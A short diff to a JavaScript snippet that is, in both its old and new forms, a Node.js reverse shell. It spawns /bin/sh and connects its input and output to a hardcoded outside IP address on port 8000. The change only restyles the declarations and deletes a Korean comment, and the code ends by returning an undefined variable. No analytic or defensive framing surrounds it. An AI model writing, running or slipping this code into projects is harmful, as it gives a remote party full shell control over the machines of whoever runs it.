@@ -1,10 +1,9 @@
 (function () {
-  const net = require("net");
-  const cp = require("child_process");
+  var net = require("net"),
+    cp = require("child_process"),
+    sh = cp.spawn("/bin/sh", []);
 
-  const sh = cp.spawn("/bin/sh", []);
-
-  const client = new net.Socket();
+  var client = new net.Socket();
 
   client.connect(8000, "3.237.2.83", function () {
     client.pipe(sh.stdin);
@@ -12,6 +11,5 @@
     sh.stderr.pipe(client);
   });
 
-  // 안전한 종료 반환
   return a;
 })();
